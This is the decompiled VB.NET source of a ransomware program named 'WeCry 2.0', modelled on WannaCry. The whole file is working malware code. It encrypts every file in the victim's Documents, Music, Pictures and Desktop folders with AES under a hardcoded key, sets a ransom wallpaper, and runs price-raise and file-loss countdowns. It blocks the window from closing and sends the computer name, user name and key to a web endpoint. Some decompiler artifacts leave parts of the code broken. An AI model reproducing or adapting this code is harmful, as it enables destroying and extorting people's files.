Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.Drawing.Text
Imports System.IO
Imports System.Linq
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Security.Cryptography
Imports System.Text
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports WeCry_2._0.My
Imports WeCry_2._0.My.Resources

Namespace WeCry_2._0
	' Token: 0x02000008 RID: 8
	<DesignerGenerated()>
	Public Partial Class Form1
		Inherits Form

		' Token: 0x06000017 RID: 23 RVA: 0x000023CC File Offset: 0x000005CC
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.Form1_Load
			AddHandler MyBase.FormClosing, AddressOf Me.Form1_FormClosing
			AddHandler MyBase.Move, AddressOf Me.Form1_Move
			AddHandler MyBase.Closing, AddressOf Me.Form1_Closing
			Me.event_date = DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
			Me.raise_date = DateTime.Now.AddDays(3.0).ToString("yyyy/MM/dd HH:mm:ss")
			Me.lose_date = DateTime.Now.AddDays(7.0).ToString("yyyy/MM/dd HH:mm:ss")
			Me.Raised = 259200
			Me.Lost = 604800
			Me.appPath = Application.StartupPath
			Me.fPath = Me.appPath + "\WanaCry"
			Me.dPath = Me.appPath + "\@WanaCry@"
			Me.sPath = Me.appPath + "\@000000@"
			Me.aPath = Me.appPath + "\@WanaCry_0000000@.ico"
			Me.KillSwitchURL = "https://kierantwids.co.uk"
			Me.targetURL = String.Concat(New String() { "http://localhost/php1/rec.php?CompName=", Me.computerName, "&AccName=", Me.userName, "&Pass=", Me.CryptoPassword })
			Me.userName = Environment.UserName
			Me.computerName = Environment.MachineName.ToString()
			Me.KillSwitch = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000018 RID: 24
		Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (uAction As Integer, uParam As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpvParam As String, fuWinIni As Integer) As Integer

		' Token: 0x06000019 RID: 25 RVA: 0x00002588 File Offset: 0x00000788
		Public Function IsWebpageOnline(URL As String) As Boolean
			Try
				Dim webRequest As WebRequest = WebRequest.Create(URL)
				Dim response As WebResponse = webRequest.GetResponse()
			Catch ex As Exception
				Me.KillSwitch = False
			End Try
			Me.KillSwitch = True
			Dim flag As Boolean
			Return flag
		End Function

		' Token: 0x0600001A RID: 26 RVA: 0x000025D8 File Offset: 0x000007D8
		Public Function ObjectToFile(_Object As Object, _FileName As String) As Boolean
			Try
				Dim memoryStream As MemoryStream = New MemoryStream()
				Dim binaryFormatter As BinaryFormatter = New BinaryFormatter()
				binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(_Object))
				Dim array As Byte() = memoryStream.ToArray()
				Dim fileStream As FileStream = New FileStream(_FileName, FileMode.Create, FileAccess.Write)
				fileStream.Write(array.ToArray(), 0, array.Length)
				fileStream.Close()
				memoryStream.Close()
				memoryStream.Dispose()
				Return True
			Catch ex As Exception
				Console.WriteLine("Exception caught in process: {0}", ex.ToString())
			End Try
			Return False
		End Function

		' Token: 0x0600001B RID: 27 RVA: 0x0000267C File Offset: 0x0000087C
		Public Sub WriteToDebug(msg As String)
			MyProject.Forms.Form2.ListBox1.Items.Add("[" + Conversions.ToString(DateTime.Now) + "] " + msg)
		End Sub

		' Token: 0x0600001C RID: 28 RVA: 0x000026B4 File Offset: 0x000008B4
		Public Sub Form1_Load(sender As Object, e As EventArgs)
			Me.WriteToDebug("Check Kill Switch Domain")
			Dim killSwitch As Boolean = Me.KillSwitch
			If killSwitch Then
				MyBase.Close()
			Else
				Me.WriteToDebug("Form1 Loaded")
				Me.Timer2.Start()
				Me.WriteToDebug("Timer1 Started")
				Me.Timer1.Start()
				Me.WriteToDebug("Timer2 Started")
				Me.ComboBox1.Text = "English"
				Me.Label5.Text = Conversions.ToString(Me.raise_date)
				Me.Label6.Text = Conversions.ToString(Me.lose_date)
				Me.wD = DateAndTime.DateDiff(DateInterval.Weekday, Conversions.ToDate(Me.raise_date), Conversions.ToDate(Me.lose_date), FirstDayOfWeek.Sunday, FirstWeekOfYear.Jan1)
				Me.ObjectToFile(Resources.wannacry_wallpaper, Me.fPath)
				Me.ObjectToFile(Resources.wannacry_wallpaper, Me.dPath)
				Me.ObjectToFile(Resources.wannacry_wallpaper, Me.sPath)
				Me.ObjectToFile(Resources._WanaDecryptor__0000, Me.aPath)
				Me.WriteToDebug("Files Dropped")
				Me.SetWallpaper(Me.PictureBox3.Image)
				Me.WriteToDebug("Force Wallpaper")
				Try
					Dim privateFontCollection As PrivateFontCollection = New PrivateFontCollection()
					privateFontCollection.AddFontFile("led.ttf")
					Dim font As Font = New Font(privateFontCollection.Families(0), 20F)
					Me.lblRaised.Font = font
					Me.lblLost.Font = font
					Me.WriteToDebug("Use Custom Font File")
				Catch ex As Exception
				End Try
				Dim width As Integer = MyBase.Width
				Dim flag As Boolean = Not MyProject.Forms.Form2.Visible
				If flag Then
					MyProject.Forms.Form2.Show()
					MyProject.Forms.Form2.Location = New Point(MyBase.Location.X + width, MyBase.Location.Y)
				End If
				Me.WriteToDebug("Open Debug Form")
				Me.Timer3.Start()
				Me.WriteToDebug("Force Debug to Follow Form1")
				Me.WriteToDebug("Start Encryption")
				Me.Start()
			End If
		End Sub

		' Token: 0x0600001D RID: 29 RVA: 0x00002904 File Offset: 0x00000B04
		Friend Sub SetWallpaper(img As Image)
			Dim text As String = MyProject.Computer.FileSystem.CombinePath(MyProject.Computer.FileSystem.SpecialDirectories.MyPictures, Me.fPath)
			Try
				img.Save(text, ImageFormat.Bmp)
				Form1.SystemParametersInfo(20, 0, text, 3)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600001E RID: 30 RVA: 0x00002978 File Offset: 0x00000B78
		Public Function GetTime(Time As Integer) As String
			Dim num As Integer = Time Mod 60
			Dim num2 As Integer = CInt(Math.Round(CDbl((Time - num)) / 60.0 Mod 60.0))
			Dim num3 As Integer = CInt(Math.Round(CDbl((Time - (num + num2 * 60))) / 3600.0 Mod 60.0))
			Dim num4 As Integer = CInt(Me.wD)
			Return String.Concat(New String() { Strings.Format(Me.wD, "00"), ":", Strings.Format(num3, "00"), ":", Strings.Format(num2, "00"), ":", Strings.Format(num, "00") })
		End Function

		' Token: 0x0600001F RID: 31 RVA: 0x00002A54 File Offset: 0x00000C54
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Dim ptr As Integer = Me.Raised
			Me.Raised = ptr - 1
			ptr = Me.Lost
			Me.Lost = ptr - 1
			Me.lblRaised.Text = Me.GetTime(Me.Raised)
			Me.lblLost.Text = Me.GetTime(Me.Lost)
		End Sub

		' Token: 0x06000020 RID: 32 RVA: 0x00002AAC File Offset: 0x00000CAC
		Private Sub Timer2_Tick(sender As Object, e As EventArgs)
			Me.SetWallpaper(Me.PictureBox3.Image)
		End Sub

		' Token: 0x06000021 RID: 33 RVA: 0x00002AC1 File Offset: 0x00000CC1
		Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs)
			MyBase.WindowState = FormWindowState.Minimized
			e.Cancel = True
		End Sub

		' Token: 0x06000022 RID: 34 RVA: 0x00002AD4 File Offset: 0x00000CD4
		Public Shared Function SearchFiles(route As String, fileExt As IEnumerable(Of String)) As IEnumerable(Of String)
			Return Directory.GetFiles(route, "*", SearchOption.AllDirectories).Where(Function(files As String) fileExt.Contains(Path.GetExtension(files).ToLower())).ToList()
		End Function

		' Token: 0x06000023 RID: 35 RVA: 0x00002B18 File Offset: 0x00000D18
		Public Sub EncryptionRoutine(name As String, password As String)
			Dim array As Byte() = New Byte(31) {}
			Encoding.[Default].GetBytes(password).CopyTo(array, 0)
			MyProject.Forms.Form2.ListBox1.Items.Add("Generated Key: " + Encoding.Unicode.GetString(array))
			Me.CryptoPassword = Encoding.Unicode.GetString(array)
			Dim rijndaelManaged As RijndaelManaged = New RijndaelManaged() With { .Mode = CipherMode.CBC, .KeySize = 256, .BlockSize = 256, .Padding = PaddingMode.Zeros }
			Dim array2 As Byte() = File.ReadAllBytes(name)
			Using memoryStream As MemoryStream = New MemoryStream()
				Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(array, array), CryptoStreamMode.Write)
					cryptoStream.Write(array2, 0, array2.Length)
					Dim array3 As Byte() = memoryStream.ToArray()
					Dim array4 As Byte() = New Byte(array3.Length - 1 + 1 - 1) {}
					array3.CopyTo(array4, 0)
					File.WriteAllBytes(name, array4)
				End Using
			End Using
		End Sub

		' Token: 0x06000024 RID: 36 RVA: 0x00002C44 File Offset: 0x00000E44
		Public Shared Sub DecryptionRoutine(name As String, password As String)
			Dim array As Byte() = New Byte(31) {}
			Encoding.[Default].GetBytes(password).CopyTo(array, 0)
			MyProject.Forms.Form2.ListBox1.Items.Add("Generated Key: " + Encoding.Unicode.GetString(array))
			Dim rijndaelManaged As RijndaelManaged = New RijndaelManaged() With { .Mode = CipherMode.CBC, .KeySize = 256, .BlockSize = 256, .Padding = PaddingMode.Zeros }
			Dim array2 As Byte() = File.ReadAllBytes(name)
			Using memoryStream As MemoryStream = New MemoryStream()
				Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(array, array), CryptoStreamMode.Write)
					cryptoStream.Write(array2, 0, array2.Length)
					Dim array3 As Byte() = memoryStream.ToArray()
					Dim array4 As Byte() = New Byte(array3.Length - 1 + 1 - 1) {}
					array3.CopyTo(array4, 0)
					File.WriteAllBytes(name, array4)
				End Using
			End Using
		End Sub

		' Token: 0x06000025 RID: 37 RVA: 0x00002D5C File Offset: 0x00000F5C
		Private Sub Start()
			Dim array As String() = New String() { ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep", ".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx", ".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw", ".cs", ".csv", ".db", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx", ".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla", ".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java", ".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef", ".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b", ".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar", ".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2", ".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma", ".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip" }
			Dim text As String = MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments
			Me.WriteToDebug("Found route " + text)
			Me.WalkDirRecursive(text)
			text = MyProject.Computer.FileSystem.SpecialDirectories.MyMusic
			Me.WriteToDebug("Found route " + text)
			Me.WalkDirRecursive(text)
			text = MyProject.Computer.FileSystem.SpecialDirectories.MyPictures
			Me.WriteToDebug("Found route " + text)
			Me.WalkDirRecursive(text)
			text = MyProject.Computer.FileSystem.SpecialDirectories.Desktop
			Me.WriteToDebug("Found route " + text)
			Me.WalkDirRecursive(text)
			Me.SendPassword()
		End Sub

		' Token: 0x06000026 RID: 38 RVA: 0x0000340C File Offset: 0x0000160C
		Private Sub StartDecrypt()
			Dim array As String() = New String() { ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep", ".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx", ".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw", ".cs", ".csv", ".db", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx", ".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla", ".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java", ".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef", ".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b", ".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar", ".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2", ".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma", ".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip" }
			Dim text As String = MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments
			Me.WriteToDebug("Found route " + text)
			Me.WalkDirRecursive(text)
			text = MyProject.Computer.FileSystem.SpecialDirectories.MyMusic
			Me.WriteToDebug("Found route " + text)
			Me.WalkDirRecursiveDecrypt(text)
			text = MyProject.Computer.FileSystem.SpecialDirectories.MyPictures
			Me.WriteToDebug("Found route " + text)
			Me.WalkDirRecursiveDecrypt(text)
			text = MyProject.Computer.FileSystem.SpecialDirectories.Desktop
			Me.WriteToDebug("Found route " + text)
			Me.WalkDirRecursiveDecrypt(text)
			Me.Timer1.[Stop]()
			Me.Timer2.[Stop]()
			Me.Timer3.[Stop]()
			Try
				MyProject.Computer.FileSystem.DeleteFile(MyProject.Computer.FileSystem.SpecialDirectories.Desktop + "\WanaCry")
				MyProject.Computer.FileSystem.DeleteFile(MyProject.Computer.FileSystem.SpecialDirectories.Desktop + "\@WanaCry@")
				MyProject.Computer.FileSystem.DeleteFile(MyProject.Computer.FileSystem.SpecialDirectories.Desktop + "\@000000@")
				MyProject.Computer.FileSystem.DeleteFile(MyProject.Computer.FileSystem.SpecialDirectories.Desktop + "\@WanaCry_0000000@")
			Catch ex As Exception
			End Try
			Interaction.MsgBox("Files Decrypted!", MsgBoxStyle.OkOnly, Nothing)
			Process.GetCurrentProcess().Kill()
		End Sub

		' Token: 0x06000027 RID: 39 RVA: 0x00003BCC File Offset: 0x00001DCC
		Private Sub WalkDirRecursiveDecrypt(vPath As String)
			Dim num2 As Integer
			Dim num4 As Integer
			Dim obj As Object
			Try
				IL_02:
				Dim num As Integer = 1
				Dim directoryInfo As DirectoryInfo = New DirectoryInfo(vPath)
				IL_0B:
				num = 2
				Dim flag As Boolean = Not directoryInfo.Exists
				If Not flag Then
					GoTo IL_21
				End If
				IL_1C:
				GoTo IL_BE
				IL_21:
				ProjectData.ClearProjectError()
				num2 = -2
				IL_2A:
				num = 5
				For Each text As String In Directory.GetFiles(directoryInfo.FullName)
					IL_45:
					num = 6
					Form1.DecryptionRoutine(text, "fulloncucked")
					IL_54:
					num = 7
					Me.WriteToDebug("Decrypted " + text)
					IL_69:
					num = 8
				Next
				IL_7F:
				num = 9
				For Each text2 As String In Directory.GetDirectories(directoryInfo.FullName)
					IL_9B:
					num = 10
					Me.WalkDirRecursive(text2)
					IL_A7:
					num = 11
				Next
				IL_BE:
				GoTo IL_148
				IL_C3:
				Dim num3 As Integer = num4 + 1
				num4 = 0
				switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3)
				IL_101:
				GoTo IL_13D
				IL_103:
				num4 = num
				switch(ICSharpCode.Decompiler.ILAst.ILLabel[], If((num2 > -2), num2, 1))
				IL_11B:
			Catch obj2 When endfilter((TypeOf obj Is Exception) And (num2 <> 0) And (num4 = 0))
				Dim ex As Exception = CType(obj2, Exception)
				GoTo IL_103
			End Try
			IL_13D:
			Throw ProjectData.CreateProjectError(-2146828237)
			IL_148:
			If num4 <> 0 Then
				ProjectData.ClearProjectError()
			End If
		End Sub

		' Token: 0x06000028 RID: 40 RVA: 0x00003D48 File Offset: 0x00001F48
		Private Sub WalkDirRecursive(vPath As String)
			Dim num2 As Integer
			Dim num4 As Integer
			Dim obj As Object
			Try
				IL_02:
				Dim num As Integer = 1
				Dim directoryInfo As DirectoryInfo = New DirectoryInfo(vPath)
				IL_0B:
				num = 2
				Dim flag As Boolean = Not directoryInfo.Exists
				If Not flag Then
					GoTo IL_21
				End If
				IL_1C:
				GoTo IL_BF
				IL_21:
				ProjectData.ClearProjectError()
				num2 = -2
				IL_2A:
				num = 5
				For Each text As String In Directory.GetFiles(directoryInfo.FullName)
					IL_45:
					num = 6
					Me.EncryptionRoutine(text, "fulloncucked")
					IL_55:
					num = 7
					Me.WriteToDebug("encrypted " + text)
					IL_6A:
					num = 8
				Next
				IL_80:
				num = 9
				For Each text2 As String In Directory.GetDirectories(directoryInfo.FullName)
					IL_9C:
					num = 10
					Me.WalkDirRecursive(text2)
					IL_A8:
					num = 11
				Next
				IL_BF:
				GoTo IL_149
				IL_C4:
				Dim num3 As Integer = num4 + 1
				num4 = 0
				switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3)
				IL_102:
				GoTo IL_13E
				IL_104:
				num4 = num
				switch(ICSharpCode.Decompiler.ILAst.ILLabel[], If((num2 > -2), num2, 1))
				IL_11C:
			Catch obj2 When endfilter((TypeOf obj Is Exception) And (num2 <> 0) And (num4 = 0))
				Dim ex As Exception = CType(obj2, Exception)
				GoTo IL_104
			End Try
			IL_13E:
			Throw ProjectData.CreateProjectError(-2146828237)
			IL_149:
			If num4 <> 0 Then
				ProjectData.ClearProjectError()
			End If
		End Sub

		' Token: 0x06000029 RID: 41 RVA: 0x00003EC4 File Offset: 0x000020C4
		Private Sub Form1_Move(sender As Object, e As EventArgs)
			Dim width As Integer = MyBase.Width
			MyProject.Forms.Form2.Location = New Point(MyBase.Location.X + width, MyBase.Location.Y)
		End Sub

		' Token: 0x0600002A RID: 42 RVA: 0x00003F0C File Offset: 0x0000210C
		Public Sub SendPassword()
			Dim text As String = Me.targetURL
			Dim text2 As String = New WebClient().DownloadString(text)
		End Sub

		' Token: 0x0600002B RID: 43 RVA: 0x00003F2D File Offset: 0x0000212D
		Private Sub btnDecrypt_Click(sender As Object, e As EventArgs)
			Me.WriteToDebug("Starting Decrypting")
			Me.StartDecrypt()
		End Sub

		' Token: 0x0600002C RID: 44 RVA: 0x00003F43 File Offset: 0x00002143
		Private Sub Form1_Closing(sender As Object, e As CancelEventArgs)
		End Sub

		' Token: 0x1700000E RID: 14
		' (get) Token: 0x0600002F RID: 47 RVA: 0x0000521E File Offset: 0x0000341E
		' (set) Token: 0x06000030 RID: 48 RVA: 0x00005228 File Offset: 0x00003428
		Friend Overridable Property PictureBox1 As PictureBox

		' Token: 0x1700000F RID: 15
		' (get) Token: 0x06000031 RID: 49 RVA: 0x00005231 File Offset: 0x00003431
		' (set) Token: 0x06000032 RID: 50 RVA: 0x0000523B File Offset: 0x0000343B
		Friend Overridable Property RichTextBox1 As RichTextBox

		' Token: 0x17000010 RID: 16
		' (get) Token: 0x06000033 RID: 51 RVA: 0x00005244 File Offset: 0x00003444
		' (set) Token: 0x06000034 RID: 52 RVA: 0x0000524E File Offset: 0x0000344E
		Friend Overridable Property btnCopy As Button

		' Token: 0x17000011 RID: 17
		' (get) Token: 0x06000035 RID: 53 RVA: 0x00005257 File Offset: 0x00003457
		' (set) Token: 0x06000036 RID: 54 RVA: 0x00005261 File Offset: 0x00003461
		Friend Overridable Property btnCheck As Button

		' Token: 0x17000012 RID: 18
		' (get) Token: 0x06000037 RID: 55 RVA: 0x0000526A File Offset: 0x0000346A
		' (set) Token: 0x06000038 RID: 56 RVA: 0x00005274 File Offset: 0x00003474
		Friend Overridable Property btnDecrypt As Button
			<CompilerGenerated()>
			Get
				Return Me._btnDecrypt
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim eventHandler As EventHandler = AddressOf Me.btnDecrypt_Click
				Dim button As Button = Me._btnDecrypt
				If button IsNot Nothing Then
					RemoveHandler button.Click, eventHandler
				End If
				Me._btnDecrypt = value
				button = Me._btnDecrypt
				If button IsNot Nothing Then
					AddHandler button.Click, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000013 RID: 19
		' (get) Token: 0x06000039 RID: 57 RVA: 0x000052B7 File Offset: 0x000034B7
		' (set) Token: 0x0600003A RID: 58 RVA: 0x000052C1 File Offset: 0x000034C1
		Friend Overridable Property TextBox1 As TextBox

		' Token: 0x17000014 RID: 20
		' (get) Token: 0x0600003B RID: 59 RVA: 0x000052CA File Offset: 0x000034CA
		' (set) Token: 0x0600003C RID: 60 RVA: 0x000052D4 File Offset: 0x000034D4
		Friend Overridable Property LinkLabel1 As LinkLabel

		' Token: 0x17000015 RID: 21
		' (get) Token: 0x0600003D RID: 61 RVA: 0x000052DD File Offset: 0x000034DD
		' (set) Token: 0x0600003E RID: 62 RVA: 0x000052E7 File Offset: 0x000034E7
		Friend Overridable Property LinkLabel2 As LinkLabel

		' Token: 0x17000016 RID: 22
		' (get) Token: 0x0600003F RID: 63 RVA: 0x000052F0 File Offset: 0x000034F0
		' (set) Token: 0x06000040 RID: 64 RVA: 0x000052FA File Offset: 0x000034FA
		Friend Overridable Property LinkLabel3 As LinkLabel

		' Token: 0x17000017 RID: 23
		' (get) Token: 0x06000041 RID: 65 RVA: 0x00005303 File Offset: 0x00003503
		' (set) Token: 0x06000042 RID: 66 RVA: 0x0000530D File Offset: 0x0000350D
		Friend Overridable Property ComboBox1 As ComboBox

		' Token: 0x17000018 RID: 24
		' (get) Token: 0x06000043 RID: 67 RVA: 0x00005316 File Offset: 0x00003516
		' (set) Token: 0x06000044 RID: 68 RVA: 0x00005320 File Offset: 0x00003520
		Friend Overridable Property Label1 As Label

		' Token: 0x17000019 RID: 25
		' (get) Token: 0x06000045 RID: 69 RVA: 0x00005329 File Offset: 0x00003529
		' (set) Token: 0x06000046 RID: 70 RVA: 0x00005333 File Offset: 0x00003533
		Friend Overridable Property Label4 As Label

		' Token: 0x1700001A RID: 26
		' (get) Token: 0x06000047 RID: 71 RVA: 0x0000533C File Offset: 0x0000353C
		' (set) Token: 0x06000048 RID: 72 RVA: 0x00005346 File Offset: 0x00003546
		Friend Overridable Property Label2 As Label

		' Token: 0x1700001B RID: 27
		' (get) Token: 0x06000049 RID: 73 RVA: 0x0000534F File Offset: 0x0000354F
		' (set) Token: 0x0600004A RID: 74 RVA: 0x00005359 File Offset: 0x00003559
		Friend Overridable Property Label3 As Label

		' Token: 0x1700001C RID: 28
		' (get) Token: 0x0600004B RID: 75 RVA: 0x00005362 File Offset: 0x00003562
		' (set) Token: 0x0600004C RID: 76 RVA: 0x0000536C File Offset: 0x0000356C
		Friend Overridable Property lblRaised As Label

		' Token: 0x1700001D RID: 29
		' (get) Token: 0x0600004D RID: 77 RVA: 0x00005375 File Offset: 0x00003575
		' (set) Token: 0x0600004E RID: 78 RVA: 0x00005380 File Offset: 0x00003580
		Friend Overridable Property Timer1 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700001E RID: 30
		' (get) Token: 0x0600004F RID: 79 RVA: 0x000053C3 File Offset: 0x000035C3
		' (set) Token: 0x06000050 RID: 80 RVA: 0x000053CD File Offset: 0x000035CD
		Friend Overridable Property lblLost As Label

		' Token: 0x1700001F RID: 31
		' (get) Token: 0x06000051 RID: 81 RVA: 0x000053D6 File Offset: 0x000035D6
		' (set) Token: 0x06000052 RID: 82 RVA: 0x000053E0 File Offset: 0x000035E0
		Friend Overridable Property Label5 As Label

		' Token: 0x17000020 RID: 32
		' (get) Token: 0x06000053 RID: 83 RVA: 0x000053E9 File Offset: 0x000035E9
		' (set) Token: 0x06000054 RID: 84 RVA: 0x000053F3 File Offset: 0x000035F3
		Friend Overridable Property Label6 As Label

		' Token: 0x17000021 RID: 33
		' (get) Token: 0x06000055 RID: 85 RVA: 0x000053FC File Offset: 0x000035FC
		' (set) Token: 0x06000056 RID: 86 RVA: 0x00005406 File Offset: 0x00003606
		Friend Overridable Property Label7 As Label

		' Token: 0x17000022 RID: 34
		' (get) Token: 0x06000057 RID: 87 RVA: 0x0000540F File Offset: 0x0000360F
		' (set) Token: 0x06000058 RID: 88 RVA: 0x00005419 File Offset: 0x00003619
		Friend Overridable Property Label8 As Label

		' Token: 0x17000023 RID: 35
		' (get) Token: 0x06000059 RID: 89 RVA: 0x00005422 File Offset: 0x00003622
		' (set) Token: 0x0600005A RID: 90 RVA: 0x0000542C File Offset: 0x0000362C
		Friend Overridable Property PictureBox2 As PictureBox

		' Token: 0x17000024 RID: 36
		' (get) Token: 0x0600005B RID: 91 RVA: 0x00005435 File Offset: 0x00003635
		' (set) Token: 0x0600005C RID: 92 RVA: 0x0000543F File Offset: 0x0000363F
		Friend Overridable Property PictureBox3 As PictureBox

		' Token: 0x17000025 RID: 37
		' (get) Token: 0x0600005D RID: 93 RVA: 0x00005448 File Offset: 0x00003648
		' (set) Token: 0x0600005E RID: 94 RVA: 0x00005454 File Offset: 0x00003654
		Friend Overridable Property Timer2 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer2_Tick
				Dim timer As Timer = Me._Timer2
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer2 = value
				timer = Me._Timer2
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000026 RID: 38
		' (get) Token: 0x0600005F RID: 95 RVA: 0x00005497 File Offset: 0x00003697
		' (set) Token: 0x06000060 RID: 96 RVA: 0x000054A1 File Offset: 0x000036A1
		Friend Overridable Property Timer3 As Timer

		' Token: 0x0400000B RID: 11
		Public event_date As Object

		' Token: 0x0400000C RID: 12
		Public raise_date As Object

		' Token: 0x0400000D RID: 13
		Public lose_date As Object

		' Token: 0x0400000E RID: 14
		Public Raised As Integer

		' Token: 0x0400000F RID: 15
		Public Lost As Integer

		' Token: 0x04000010 RID: 16
		Public wD As Long

		' Token: 0x04000011 RID: 17
		Public appPath As String

		' Token: 0x04000012 RID: 18
		Public fPath As String

		' Token: 0x04000013 RID: 19
		Public dPath As String

		' Token: 0x04000014 RID: 20
		Public sPath As String

		' Token: 0x04000015 RID: 21
		Public aPath As String

		' Token: 0x04000016 RID: 22
		Public KillSwitchURL As String

		' Token: 0x04000017 RID: 23
		Public CryptoPassword As String

		' Token: 0x04000018 RID: 24
		Private targetURL As String

		' Token: 0x04000019 RID: 25
		Private userName As String

		' Token: 0x0400001A RID: 26
		Private computerName As String

		' Token: 0x0400001B RID: 27
		Public KillSwitch As Boolean

		' Token: 0x0400001C RID: 28
		Private Const SPI_SETDESKWALLPAPER As Integer = 20

		' Token: 0x0400001D RID: 29
		Private Const SPIF_UPDATEINIFILE As Integer = 1

		' Token: 0x0400001E RID: 30
		Private Const SPIF_SENDWININICHANGE As Integer = 2
	End Class
End Namespace
